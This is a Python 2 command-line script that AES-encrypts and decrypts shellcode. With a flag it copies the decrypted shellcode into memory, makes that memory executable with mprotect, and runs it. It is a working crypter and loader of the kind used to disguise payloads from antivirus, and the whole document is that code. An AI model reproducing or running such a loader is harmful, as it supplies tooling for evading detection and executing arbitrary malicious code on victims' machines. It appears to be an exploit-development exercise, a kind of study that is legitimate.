#!/usr/bin/env python2
# Python AES Encrpyer and decryptor 
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import argparse
import ctypes
from ctypes import *

def encrypt(key,shellcode,IV):
    cipher = AES.new(key,AES.MODE_CBC, IV)
    return cipher.encrypt(shellcode)

def decrypt(key,shellcode,IV):
    cipher = AES.new(key,AES.MODE_CBC, IV)
    return cipher.decrypt(shellcode)

def bytes_to_hex(data):
    output = ""
    for i in data:
        output  += "\\x" + i.encode("hex")
    return output

def encrypt_shellcode(data):
    IV = get_random_bytes(16)
    key = get_random_bytes(16)
    print("\n**** Encrypting Shellcode ****\n")
    print("Key: " + bytes_to_hex(key))
    print("IV : " +bytes_to_hex(IV) +"\n")
    print("Supplied Shellcode:\n" + bytes_to_hex(data) + "\n")
    padded = pad(data,16)
    encrypted_data = encrypt(key,padded,IV)
    print("Encrypted Shellcode:\n" + bytes_to_hex(encrypted_data)+ "\n")

def decrypt_shellcode(key,shellcode,IV,execute_shellcode):
    print("\n**** Decrypting Shellcode ****\n")
    print("Key: " + bytes_to_hex(key))
    print("IV : " +bytes_to_hex(IV) +"\n")
    print("Supplied Shellcode:\n" + bytes_to_hex(shellcode) + "\n")
    decrypted_data = decrypt(key,shellcode,IV)
    unpadded = unpad(decrypted_data,16)
    print("Decrypted shellcode:\n" + bytes_to_hex(unpadded)+ "\n")
    if execute_shellcode:
        print("Running decrypted shellcode........\n")
        run_shellcode(unpadded)

def run_shellcode(shellcode):
    libC = CDLL('libc.so.6')
    code = c_char_p(shellcode)
    sizeOfDecryptedShellcode = len(shellcode)
    memAddrPointer = c_void_p(libC.valloc(sizeOfDecryptedShellcode))
    codeMovePointer = memmove(memAddrPointer, code, sizeOfDecryptedShellcode)
    protectMemory = libC.mprotect(memAddrPointer, sizeOfDecryptedShellcode, 7)
    run = cast(memAddrPointer, CFUNCTYPE(c_void_p))
    run()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-e", "--encrypt", help="AES encrypt shellcode ", action="store_true")
    parser.add_argument("-d", "--decrypt", help="AES decrypt shellcode ", action="store_true")
    parser.add_argument("-i", "--iv", help="IV for decryption, supplied as Hex", action="store")
    parser.add_argument("-k", "--key", help="Key for decryption, supplied as Hex", action="store")
    parser.add_argument("-r", "--run", help="Run shellcode after decryption", action="store_true")
    parser.add_argument("shellcode", help="Shellcode, supplied as Hex")
    args = parser.parse_args()
    shellcode_bytes = args.shellcode.replace("x","").replace('"','').decode('hex')
    if args.encrypt:
        encrypt_shellcode(shellcode_bytes)
    if args.decrypt:
        key_bytes = args.key.replace("x","").replace('"','').decode('hex')
        iv_bytes = args.iv.replace("x","").replace('"','').decode('hex')
        decrypt_shellcode(key_bytes,shellcode_bytes,iv_bytes,args.run)

if __name__ == "__main__":
    main()
    





